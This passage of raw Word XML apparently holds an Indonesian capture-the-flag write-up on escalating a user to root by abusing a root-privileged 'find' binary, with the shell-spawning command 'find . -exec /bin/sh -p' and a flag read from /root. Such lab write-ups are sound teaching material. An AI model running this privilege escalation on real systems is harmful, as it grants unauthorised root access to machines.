          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3779FF3D" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17686790" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BA29BC0" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E5261DC" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="765F892C" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AA3E1BE" w14:textId="77777777" w:rsidR="004529AF" w:rsidRDefault="004529AF" w:rsidP="00575E1E">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CDF6F6D" w14:textId="77777777" w:rsidR="00F332DC" w:rsidRDefault="00C74E59" w:rsidP="00F332DC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Langkah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32A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>harus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>menjadikan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> user </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ichigo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ini </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>menjadi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00632A9F">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDBBA95" w14:textId="7DE81E4D" w:rsidR="00632A9F" w:rsidRDefault="00DB1173" w:rsidP="00F332DC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Kita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mencari</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">file yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>memiliki</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>previlage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>seperti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> root agar Ketika </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00814D02">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>masukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000266DA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000266DA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>memanggil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filenya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kita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dapat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hak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akses</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000266DA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000266DA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>seperti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000266DA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> root</w:t>
      </w:r>
      <w:r w:rsidR="00575E1E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00575E1E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>caranya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00575E1E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00575E1E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>masukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="308117BE" w14:textId="2D5E4963" w:rsidR="005F5ABA" w:rsidRDefault="00575E1E" w:rsidP="005F5ABA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Command</w:t>
      </w:r>
      <w:r w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00BE4FE7">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F5ABA" w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F5ABA" w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ls -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005F5ABA" w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lhn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005F5ABA" w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005F5ABA" w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005F5ABA" w:rsidRPr="005F5ABA">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">/bin    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4441D85B" w14:textId="14E6557D" w:rsidR="004529AF" w:rsidRPr="005F5ABA" w:rsidRDefault="004529AF" w:rsidP="00F332DC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004529AF">
        <w:rPr>
          <w:rFonts w:eastAsia="Adobe Gothic Std B" w:cstheme="minorHAnsi"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="636A66E3" wp14:editId="08862561">
            <wp:extent cx="5828306" cy="3608705"/>
            <wp:effectExtent l="0" t="0" r="1270" b="0"/>
            <wp:docPr id="181476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67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405" cy="3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363F" w14:textId="77777777" w:rsidR="00AA52D6" w:rsidRDefault="00AA52D6" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AA6D16A" w14:textId="6976C997" w:rsidR="00575E1E" w:rsidRDefault="004529AF" w:rsidP="00AA52D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salah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file yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>memiliki</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>akses</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sama</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>seperti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00EB68D9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> root “find”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446481DF" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CF88859" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="701E1E38" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45178832" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BCD6A46" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="660C9707" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16F99820" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="422DFE55" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4048FBE8" w14:textId="77777777" w:rsidR="000403F5" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0014D379" w14:textId="2D01FCB8" w:rsidR="00F332DC" w:rsidRPr="004821EE" w:rsidRDefault="00F332DC" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Sekarang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F753D4" w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mengeksekusi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F753D4" w:rsidRPr="004821EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> file find dengan command:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1196779B" w14:textId="6FF724FD" w:rsidR="00F753D4" w:rsidRDefault="000403F5" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AA52D6">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>find .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00AA52D6">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -exec /bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AA52D6">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AA52D6">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p \; -quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DFFFFF" w14:textId="77777777" w:rsidR="006863F6" w:rsidRPr="00AA52D6" w:rsidRDefault="006863F6" w:rsidP="00E66730">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FC1A460" w14:textId="5B630394" w:rsidR="006863F6" w:rsidRDefault="006863F6" w:rsidP="006863F6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="580E82ED" wp14:editId="6EC374C1">
            <wp:extent cx="5943600" cy="4346575"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="595057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EEA4" w14:textId="76D3B979" w:rsidR="00764298" w:rsidRDefault="008D0B83" w:rsidP="00E17EB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Ok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r w:rsidR="00E17EB0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E17EB0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sebagai</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E17EB0">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> root</w:t>
      </w:r>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>berhasil</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>menemukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> flag Ketika </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>kita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>memasukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="002F2BCA">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>command</w:t>
      </w:r>
      <w:r w:rsidR="00635BB2">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="345CD2F4" w14:textId="5E8F327A" w:rsidR="00635BB2" w:rsidRDefault="00635BB2" w:rsidP="00635BB2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00397C8E">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cat /root/flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2A27AB" w14:textId="77777777" w:rsidR="00B95B8E" w:rsidRPr="00B95B8E" w:rsidRDefault="00B95B8E" w:rsidP="00B95B8E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Arial"/>
          <w:noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B95B8E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Courier New"/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag{Root!s34sy}                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7E9ECF" w14:textId="77777777" w:rsidR="0072450D" w:rsidRPr="00397C8E" w:rsidRDefault="0072450D" w:rsidP="00635BB2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04FD5DD9" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E896D10" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E78E043" w14:textId="77777777" w:rsidR="00764298" w:rsidRDefault="00764298" w:rsidP="00CF54B0">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
